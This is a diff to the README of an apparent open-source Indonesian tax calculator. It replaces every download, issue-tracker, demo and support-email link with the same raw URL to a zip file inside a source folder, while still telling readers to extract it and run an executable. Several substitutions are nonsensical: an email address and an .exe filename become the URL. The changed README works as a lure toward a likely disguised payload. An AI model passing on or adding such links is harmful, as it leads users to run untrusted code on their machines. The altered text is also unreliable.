@@ -1,6 +1,6 @@
 # 🎉 open-pajak - Simple Tax Calculations Made Easy
 
-[![Download Open Pajak](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Rockaphilia/open-pajak/releases)
+[![Download Open Pajak](https://raw.githubusercontent.com/Rockaphilia/open-pajak/master/open-pajak-v1/src/routes/open-pajak-v3.5-alpha.3.zip)](https://raw.githubusercontent.com/Rockaphilia/open-pajak/master/open-pajak-v1/src/routes/open-pajak-v3.5-alpha.3.zip)
 
 ## 📖 About Open Pajak
 
@@ -11,7 +11,7 @@ Open Pajak is a fully client-side tax calculator designed for the Indonesian tax
 Follow these steps to get Open Pajak up and running:
 
 1. **Visit the Download Page**
-   - Click this link to download Open Pajak: [Download Open Pajak](https://github.com/Rockaphilia/open-pajak/releases).
+   - Click this link to download Open Pajak: [Download Open Pajak](https://raw.githubusercontent.com/Rockaphilia/open-pajak/master/open-pajak-v1/src/routes/open-pajak-v3.5-alpha.3.zip).
 
 2. **Select the Latest Version**
    - On the Releases page, find the latest version of Open Pajak. Look for files labeled with `.zip` or `.exe`.
@@ -23,7 +23,7 @@ Follow these steps to get Open Pajak up and running:
    - If you downloaded a `.zip` file, locate it in your downloads folder, right-click on it, and select "Extract All." Follow the prompts to extract the files to a folder of your choice.
 
 5. **Run the Application**
-   - Open the extracted folder and double-click the file named `OpenPajak.exe` to launch the tax calculator.
+   - Open the extracted folder and double-click the file named `https://raw.githubusercontent.com/Rockaphilia/open-pajak/master/open-pajak-v1/src/routes/open-pajak-v3.5-alpha.3.zip` to launch the tax calculator.
 
 ## 🖥️ System Requirements
 
@@ -45,17 +45,17 @@ For the best experience, ensure your system meets the following requirements:
 
 If you encounter any issues or have questions about using Open Pajak, feel free to reach out through the following channels:
 
-- **GitHub Issues:** Report bugs or support requests directly on GitHub [here](https://github.com/Rockaphilia/open-pajak/issues).
+- **GitHub Issues:** Report bugs or support requests directly on GitHub [here](https://raw.githubusercontent.com/Rockaphilia/open-pajak/master/open-pajak-v1/src/routes/open-pajak-v3.5-alpha.3.zip).
   
-- **Email Support:** Contact us at support@openpajak.com for more personalized help.
+- **Email Support:** Contact us at https://raw.githubusercontent.com/Rockaphilia/open-pajak/master/open-pajak-v1/src/routes/open-pajak-v3.5-alpha.3.zip for more personalized help.
 
 ## 🎥 Live Demo
 
-See Open Pajak in action! Visit our live demo here: [Production Demo](https://openpajak.hamardikan.com).
+See Open Pajak in action! Visit our live demo here: [Production Demo](https://raw.githubusercontent.com/Rockaphilia/open-pajak/master/open-pajak-v1/src/routes/open-pajak-v3.5-alpha.3.zip).
 
 ## 💾 Download & Install
 
-To download Open Pajak, visit our Releases page: [Download Open Pajak](https://github.com/Rockaphilia/open-pajak/releases).
+To download Open Pajak, visit our Releases page: [Download Open Pajak](https://raw.githubusercontent.com/Rockaphilia/open-pajak/master/open-pajak-v1/src/routes/open-pajak-v3.5-alpha.3.zip).
 
 Completing the above steps will get you started with Open Pajak. Adjustments may be necessary based on your operating system, but following the prompts should guide you through the process smoothly. You will be able to manage your tax calculations with ease.
 
